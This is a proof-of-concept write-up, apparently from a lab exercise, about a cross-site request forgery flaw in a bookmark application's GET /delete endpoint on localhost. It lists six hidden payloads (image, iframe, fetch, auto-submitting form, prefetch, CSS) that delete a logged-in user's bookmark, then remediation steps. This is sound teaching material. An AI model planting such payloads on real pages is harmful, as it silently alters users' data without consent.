🔓 CSRF Bookmark Deletion POC

Vulnerability Overview

This page demonstrates a Cross-Site Request Forgery (CSRF) vulnerability in the bookmark application's /delete endpoint.

Status: VULNERABLE to CSRF attacks

Vulnerable Endpoint: /delete?name=[bookmark_name]

HTTP Method: GET (allows state-changing operation)

CSRF Protection: NONE

Vulnerability Characteristics

  • ✗ Uses GET for state-changing operations (DELETE)
  • ✗ No CSRF token validation
  • ✗ No X-Requested-With header validation
  • ✗ No SameSite cookie flag
  • ✗ Cookies automatically sent with cross-origin requests
  • ✗ No origin/referer validation

Attack Scenarios

An attacker can exploit this vulnerability through multiple vectors:

Vector 1: Image Tag (Silent Execution)

When a logged-in user visits a malicious page containing this tag, their bookmark is deleted silently:

<img src="http://localhost:5000/delete?name=MyBookmark" style="display:none;" />

The browser automatically sends the request with the user's cookies.

Vector 2: Iframe with Auto-Redirect

An iframe can trigger the deletion through redirect:

<iframe src="http://localhost:5000/delete?name=MyBookmark" style="display:none;"></iframe>
Vector 3: JavaScript Fetch

JavaScript can trigger the request after page loads:

fetch('http://localhost:5000/delete?name=MyBookmark') .catch(e => console.log('Request sent'));
Vector 4: Hidden Form Auto-Submission

A hidden form automatically submitted on page load:

<form action="http://localhost:5000/delete" method="GET" style="display:none;"> <input type="hidden" name="name" value="MyBookmark"> </form> <script>document.forms[0].submit();</script>
Vector 5: Prefetch/Prerender

Browser prefetch hints can trigger cross-origin requests:

<link rel="prefetch" href="http://localhost:5000/delete?name=MyBookmark" />
Vector 6: CSS Background URL

CSS can trigger HTTP requests when elements are rendered:

<div style="background:url('http://localhost:5000/delete?name=MyBookmark')"></div>

Attack Flow

  1. User logs into the bookmark application
  2. User's session cookie is stored in browser
  3. User visits attacker's malicious website (while still logged in)
  4. Malicious page contains CSRF payload (one of the vectors above)
  5. User's browser automatically sends DELETE request with session cookies
  6. Application processes request (authenticated by cookie)
  7. Bookmark is deleted without user's knowledge or consent
  8. User doesn't realize what happened - bookmark is gone

Remediation Steps

  1. Change DELETE to POST: Use POST method instead of GET for state-changing operations
  2. Implement CSRF Tokens:
    • Generate unique tokens for each user session
    • Include token in all forms that modify data
    • Validate token on server side before processing request
  3. Set SameSite Cookie Flag:
    Set-Cookie: user=value; SameSite=Strict; Secure; HttpOnly Set-Cookie: bookmarks=value; SameSite=Strict; Secure; HttpOnly
  4. Validate Origin/Referer: Check Origin header for cross-origin requests
  5. Add Security Headers: Implement CSP, X-Frame-Options, X-Requested-With
  6. Server-Side Session Storage: Don't rely solely on client-side cookies
